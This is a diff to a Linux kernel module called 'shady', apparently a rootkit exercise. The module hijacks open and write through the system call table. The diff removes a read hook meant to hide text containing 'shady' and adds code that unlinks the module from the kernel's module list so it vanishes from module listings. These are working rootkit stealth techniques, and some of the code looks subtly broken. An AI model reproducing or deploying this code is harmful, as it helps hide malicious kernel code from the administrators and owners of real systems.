@@ -62,7 +62,6 @@ static struct class *shady_class = NULL;
 //my variables
 asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage ssize_t (*old_write) (int fd, const void *buf, size_t count);
-asmlinkage ssize_t (*old_read) (int fd, const void *buf, size_t count);
 
 asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
 {
@@ -86,38 +85,6 @@ asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
           }
      }
      return old_write(fd, buf, count);
-}
-
-asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
-{
-     //char nameBuffer[13];
-     //char* filename = "/proc/modules";
-     int i;
-     int searchIndex = 0;
-     int searchLength = 5;
-     char searchText[] = "shady";
-     //char readlinkPath[PATH_MAX];
-     //sprintf(&readlinkPath, "/proc/self/fd/%d", fd);
-     //readlink(readlinkPath, nameBuffer, 13);
-     /*if(!strcmp(filename, nameBuffer))
-     {*/
-          for(i=0; i<count; i++)
-          {
-               if(((char*)buf)[i]==searchText[searchIndex])
-               {
-                    searchIndex++;
-                    if(searchIndex==searchLength)
-                    {
-                         return count;
-                    }
-               }
-               else
-               {
-                    searchIndex=0;
-               }
-          }
-     //}
-     return old_read(fd, buf, count);
 }
 
 
@@ -279,7 +246,6 @@ shady_cleanup_module(int devices_to_destroy)
      //my code
      ((unsigned long **)system_call_table_address)[__NR_open] = old_open;
      ((unsigned long **)system_call_table_address)[__NR_write] = old_write;
-     ((unsigned long **)system_call_table_address)[__NR_read] = old_read;
      //end
 	
   /* Get rid of character devices (if any exist) */
@@ -322,10 +288,12 @@ shady_init_module(void)
      //hiding code
      old_write = ((unsigned long **)system_call_table_address)[__NR_write];
      ((unsigned long **)system_call_table_address)[__NR_write] = my_write;
-     old_read = ((unsigned long **)system_call_table_address)[__NR_read];
-     ((unsigned long **)system_call_table_address)[__NR_read] = my_read;
+     
+     THIS_MODULE->list->prev->next = THIS_MODULE->list->next;
+     THIS_MODULE->list->next->prev = THIS_MODULE->list->prev;
      //end
 	
+     
   if (shady_ndevices <= 0)
     {
       printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
